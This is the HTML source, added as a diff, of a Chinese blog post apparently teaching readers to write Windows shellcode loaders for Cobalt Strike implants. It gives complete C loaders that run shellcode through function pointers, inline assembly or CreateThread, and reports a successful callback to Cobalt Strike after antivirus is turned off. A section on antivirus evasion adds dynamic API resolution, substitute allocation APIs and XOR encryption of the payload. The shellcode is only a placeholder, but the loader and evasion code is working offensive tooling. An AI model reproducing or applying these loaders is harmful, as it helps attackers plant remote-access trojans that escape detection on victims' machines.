@@ -1,0 +1,863 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  data-theme="dark" >
+  <head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+
+    gtag('config', 'true');
+  </script>
+  <!-- End Google Analytics -->
+
+
+  
+
+  
+  <script async src="https://hm.baidu.com/hm.js?true"></script>
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    _hmt.push(["_trackPageview", location.pathname]);
+  </script>
+
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.outdate = {"enable":true,"daysAgo":180,"message":"本文最后更新于 {time}，请注意文中内容可能已经发生变化。"};</script>
+  
+  
+  <title>
+    初始shellcode加载器（持续更新） |
+    
+    yyjccc的博客
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  <meta name="description" content="‍ shellcode 这个概念本应来自pwn,shellcode为16进制的机器码，因为经常让攻击者获得shell而得名 ‍ Shellcode 是一组通常用汇编语言编写的机器代码指令，旨在由计算机处理器直接执行。因为汇编指令是特定于体系结构的，这限制了 shellcode 在不同处理器之间的可移植性 ‍ 为什么需要shellcode 加载器 使用cs或者msf生成的exe远控木马，特征极强，当">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初始shellcode加载器（持续更新）">
+<meta property="og:url" content="https://yyjccc.github.io/2024/11/09/%E5%88%9D%E8%AF%86shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/index.html">
+<meta property="og:site_name" content="yyjccc的博客">
+<meta property="og:description" content="‍ shellcode 这个概念本应来自pwn,shellcode为16进制的机器码，因为经常让攻击者获得shell而得名 ‍ Shellcode 是一组通常用汇编语言编写的机器代码指令，旨在由计算机处理器直接执行。因为汇编指令是特定于体系结构的，这限制了 shellcode 在不同处理器之间的可移植性 ‍ 为什么需要shellcode 加载器 使用cs或者msf生成的exe远控木马，特征极强，当">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-9/1.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-9/2.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/24-11-9/3.png">
+<meta property="article:published_time" content="2024-11-09T15:43:03.832Z">
+<meta property="article:modified_time" content="2024-11-09T15:50:39.050Z">
+<meta property="article:author" content="Yyjccc">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="shellcode">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yyjccc.github.io/img/24-11-9/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="yyjccc的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+    
+      
+<link rel="stylesheet" href="https://npm.webcache.cn/gitalk/dist/gitalk.css">
+
+    
+  
+  
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+  <body>
+    
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">首页</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="/images/cover/7.jpg" alt="初始shellcode加载器（持续更新）">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">初始shellcode加载器（持续更新）</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-初识shellcode加载器" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2024/11/09/%E5%88%9D%E8%AF%86shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2024-11-09T15:43:03.832Z" itemprop="datePublished">2024-11-09</time>
+    <time style="display: none;" id="post-update-time">2024-11-09</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Windows/" data-aos="zoom-in">Windows</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote id="outdate-blockquote" style="display: none;"><p></p></blockquote>
+      
+      
+        <p>‍</p>
+<p>shellcode 这个概念本应来自pwn,shellcode为16进制的机器码，因为经常让攻击者获得shell而得名</p>
+<p>‍</p>
+<p>Shellcode 是一组通常用汇编语言编写的机器代码指令，旨在由计算机处理器直接执行。因为汇编指令是特定于体系结构的，这限制了 shellcode 在不同处理器之间的可移植性</p>
+<p>‍</p>
+<p>为什么需要shellcode 加载器</p>
+<p>使用cs或者msf生成的exe远控木马，特征极强，当使用shellcode 加载的方式上线，更容易做免杀操作,接下来的是Windows下的shellcode加载器</p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="shellcode-生成"><a href="#shellcode-生成" class="headerlink" title="shellcode 生成"></a>shellcode 生成</h2><p>暂且现在水平有限，还不会手搓shellcode，使用工具生成shellcode</p>
+<p>‍</p>
+<h4 id="cs"><a href="#cs" class="headerlink" title="cs"></a>cs</h4><img src="/img/24-11-9/1.png">
+
+<p>选择监听器</p>
+<img src="/img/24-11-9/2.png">
+
+<p>‍</p>
+<h2 id="shellcode加载步骤"><a href="#shellcode加载步骤" class="headerlink" title="shellcode加载步骤"></a>shellcode加载步骤</h2><p>基本都是差不多的步骤</p>
+<ol>
+<li>向操作系统申请一段可写可执行的内存</li>
+<li>将shellcode 拷贝到申请的内存中</li>
+<li>将程序的EIP指向shellcode区域，执行shellcode</li>
+</ol>
+<p>‍</p>
+<p>‍</p>
+<ol>
+<li><strong>申请虚拟内存</strong></li>
+</ol>
+<p>windows中最常见的Windows API就是<code>VirtualAlloc</code>​</p>
+<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPVOID lpAddress,		<span class="comment">// 指定分配内存的起始地址，NULL表示由系统决定地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           SIZE_T dwSize,			 <span class="comment">// 分配的内存大小（字节数）</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD  flAllocationType,	<span class="comment">// 内存的分配类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD  flProtect			<span class="comment">// 内存区域的保护属性</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><p><strong>flAllocationType</strong>：指定内存分配的方式，常用值如下：</p>
+<ul>
+<li>​<code>MEM_COMMIT</code>​：将内存页面从保留状态变为提交状态，使其可读写。</li>
+<li>​<code>MEM_RESERVE</code>​：保留一块虚拟地址空间，但不实际分配物理内存。与 <code>MEM_COMMIT</code>​ 搭配使用。</li>
+<li>​<code>MEM_RESET</code>​：通知系统内存已不再需要，但并不影响该内存块的使用。</li>
+<li>​<code>MEM_RELEASE</code>​：释放内存，将 <code>dwSize</code>​ 设为 <code>0</code>​ 。</li>
+</ul>
+</li>
+<li><p><strong>lProtect</strong>：设置内存页面的访问权限，常用值包括：</p>
+<ul>
+<li>​<code>PAGE_READONLY</code>​：只读访问。</li>
+<li>​<code>PAGE_READWRITE</code>​：可读写访问。</li>
+<li>​<code>PAGE_EXECUTE_READWRITE</code>​：可执行和读写访问。</li>
+</ul>
+</li>
+</ul>
+<p>‍</p>
+<p>​<code>LPVOID</code>​ 是Windows API中的一种指针类型，定义在<code>&lt;windows.h&gt;</code>​中。实际上是一个指向任意类型的指针，通常定义为 <code>void*</code>​ 类型的别名。</p>
+<p>‍</p>
+<p>使用：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">PVOID p=<span class="literal">NULL</span>;</span><br><span class="line">p= (<span class="type">char</span>*)VirtualAlloc(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>‍</p>
+<p>可以先申请为可读可写，然后使用VirtualProtect 修改权限,或者直接修改存储shellcode变量内存区域的权限</p>
+<p>‍</p>
+<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line">DWORD oldProtect;</span><br><span class="line"><span class="built_in">VirtualProtect</span>((LPVOID)p, <span class="keyword">sizeof</span> p, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>或者</p>
+<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">VirtualProtect</span>(&amp;buf, <span class="keyword">sizeof</span> buf, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>​<code>[in] lpAddress</code>​:要更改访问保护属性的页面区域的起始页面的地址。</p>
+<p>​<code>[out] lpflOldProtect</code>​:指向变量的指针，该变量接收指定页面区域中第一页的先前访问保护值。如果此参数为<strong>NULL</strong>或未指向有效变量，则函数失败</p>
+<p>‍</p>
+<ol start="2">
+<li><strong>拷贝到内存</strong></li>
+</ol>
+<p>memcpy: c语言中标准函数，用于复制内存</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(p,shellcode,<span class="keyword">sizeof</span> (shellcode));</span><br></pre></td></tr></tbody></table></figure>
+
+<p>或者使用CopyMeory</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">CopyMeory(shellcode,buf,<span class="keyword">sizeof</span>(buf));</span><br></pre></td></tr></tbody></table></figure>
+
+<p>‍</p>
+<ol start="3">
+<li><strong>执行shellcode</strong></li>
+</ol>
+<p>最简单的就是指针执行</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">((  <span class="type">void</span>(*)() ) p) ();</span><br></pre></td></tr></tbody></table></figure>
+
+<p>将指针p强制转为无返回参数的函数指针 调用</p>
+<p>‍</p>
+<p>‍</p>
+<p>最后代码：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">"shellcode......"</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    PVOID p=<span class="literal">NULL</span>;</span><br><span class="line">    p= (<span class="type">char</span>*)VirtualAlloc(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(buf),MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(p,buf,<span class="keyword">sizeof</span> (buf));</span><br><span class="line">    <span class="keyword">if</span> (p==<span class="literal">NULL</span>){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error"</span>);</span><br><span class="line">    }</span><br><span class="line">    ((  <span class="type">void</span>(*)() ) p) ();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>关闭杀软,编译运行</p>
+<p>成功上线cs</p>
+<img src="/img/24-11-9/3.png">
+
+<p>‍</p>
+<p>这个只是最简单的shellcode loader ，还没有任何的免杀操作，落地就会被杀软干掉，杀软静态检测都过不了</p>
+<p>‍</p>
+<p>通过代码大致了解了shellcode 如何去加载执行</p>
+<p>本质上，程序中shellcode存放的数据放在数据段，其不具备可执行权限，所以是不能直接执行的</p>
+<p>而我们需要做的正是将其具备RWX权限</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="其他执行方式"><a href="#其他执行方式" class="headerlink" title="其他执行方式"></a>其他执行方式</h2><p>上面介绍了指针执行,下面还有几种执行方式</p>
+<p>‍</p>
+<h4 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h4><p>只适用于x86</p>
+<p>指定编译器赋予数据段可读可写可执行权限</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">"/section:.data,RWE"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">"shellcode“;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">void asm_exe() {</span></span><br><span class="line"><span class="string">    __asm</span></span><br><span class="line"><span class="string">    {</span></span><br><span class="line"><span class="string">        lea eax, buf;</span></span><br><span class="line"><span class="string">        call eax;</span></span><br><span class="line"><span class="string">    }</span></span><br><span class="line"><span class="string">}</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>‍</p>
+<h4 id="线程执行"><a href="#线程执行" class="headerlink" title="线程执行"></a>线程执行</h4><p>可以去看PE文件中TLS表相关内容，可以注册回调函数，在进程或者线程创建或者销毁时候执行，类似与dll中的主函数</p>
+<p>‍</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">thread_exe</span><span class="params">()</span> {</span><br><span class="line">    DWORD dwThread;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    <span class="type">char</span>* shellcode = (<span class="type">char</span>*)VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    CopyMemory(shellcode,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    hThread=CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)shellcode, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwThread);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="一点点Bypass"><a href="#一点点Bypass" class="headerlink" title="一点点Bypass"></a>一点点Bypass</h2><p>一些免杀思路：</p>
+<ol>
+<li>对shellcode加密：杀软可能扫描字符串，并且未加密 的shellcode 静态扫描就能暴露 c2地址</li>
+<li>调用功能相似的api: 替换调一些常用api</li>
+<li>使用<code>LoadLibraryA</code>​动态加载调用函数：上篇PE文件结构里面就提到过，导入表，调用外部的函数，将会出现在导入表中，这样杀软可以扫描导入表来判断</li>
+<li>shellcod 与加载器分离，分离加载</li>
+</ol>
+<p>‍</p>
+<p>除此之外呢，还可以编写驱动程序，上升为内核态与安全设备对抗</p>
+<p>‍</p>
+<h4 id="动态获取函数"><a href="#动态获取函数" class="headerlink" title="动态获取函数"></a>动态获取函数</h4><p>LoadLibraryA 加载一个dll, kerneal32.dll 基本每一个exe都会加载，所以加载这个dll没问题</p>
+<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">HMODULE <span class="title">LoadLibraryA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCSTR lpLibFileName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>返回值是模块的句柄。</p>
+<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line">HMODULE hKernel32 = <span class="built_in">LoadLibraryA</span>(<span class="string">"Kernel32.dll"</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>GetProcAddress 获取 函数地址</p>
+<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">FARPROC <span class="title">GetProcAddress</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCSTR  lpProcName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>​<code>[in] hModule</code>​ ：包含函数或变量的 DLL 模块的句柄。 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibrary</a> 、 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa">LoadLibraryEx</a> 、 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-loadpackagedlibrary">LoadPackagingLibrary</a>或<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea">GetModuleHandle</a>函数返回此句柄。</p>
+<p>如果函数成功，返回值是导出函数或变量的地址。</p>
+<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">"VirtualAlloc"</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* pVirtualAlloc)</span><span class="params">(LPVOID, DWORD, DWORD, DWORD)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pVirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* pCreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pWaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line">    HMODULE hKernel32 = <span class="built_in">LoadLibraryA</span>(<span class="string">"Kernel32.dll"</span>);</span><br><span class="line">    pVirtualAlloc PVirtualAlloc = (pVirtualAlloc)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">"VirtualAlloc"</span>);</span><br><span class="line">    pVirtualProtect PVirtualProtect = (pVirtualProtect)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">"VirtualProtect"</span>);</span><br><span class="line">    pCreateThread PCreateThread = (pCreateThread)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">"CreateThread"</span>);</span><br><span class="line">    pWaitForSingleObject PWaitForSingleObject = (pWaitForSingleObject)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">"WaitForSingleObject"</span>);</span><br><span class="line">  </span><br><span class="line">    DWORD oldProtect=<span class="number">0</span>;</span><br><span class="line">    BOOL flag=<span class="built_in">PVirtualProtect</span>(&amp;buf, <span class="keyword">sizeof</span> buf, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    DWORD dwTHread;</span><br><span class="line">    HANDLE hThread = <span class="built_in">PCreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)(CHAR*)buf, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwTHread);</span><br><span class="line">    <span class="built_in">PWaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<p>此外还可以进一步隐藏行为，遍历当前进程的PEB和TEB拿到Kernernal32的基址（后续更新）</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<p>VirtualAlloc 可以进行替换</p>
+<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line">GlobalAlloc</span><br><span class="line">CoTaskMemAlloc</span><br><span class="line">RtlCreateHeap</span><br><span class="line">AllocADsMem</span><br><span class="line">ReallocADsMem</span><br></pre></td></tr></tbody></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>杀软会扫描字符串，所以需要对原始的shellcode进行加密，通过静态检查</p>
+<h4 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h4><figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">xor_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">int</span> data_len, <span class="type">const</span> <span class="type">char</span>* key)</span> </span>{</span><br><span class="line">    <span class="type">int</span> key_len = <span class="built_in">strlen</span>(key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; data_len; i++) {</span><br><span class="line">        data[i] ^= key[i % key_len];  <span class="comment">// 按密钥循环异或</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后shellcode loader中存放加密的字符串，然后解密后进行加载</p>
+<p>‍</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2>
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/images/cover/6.jpg" data-sizes="auto" alt="NTLM" class="lazyload">
+      
+      <a href="/2024/11/02/NTLM/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          NTLM
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+  <div id="comments" class="gtcomment"></div>
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
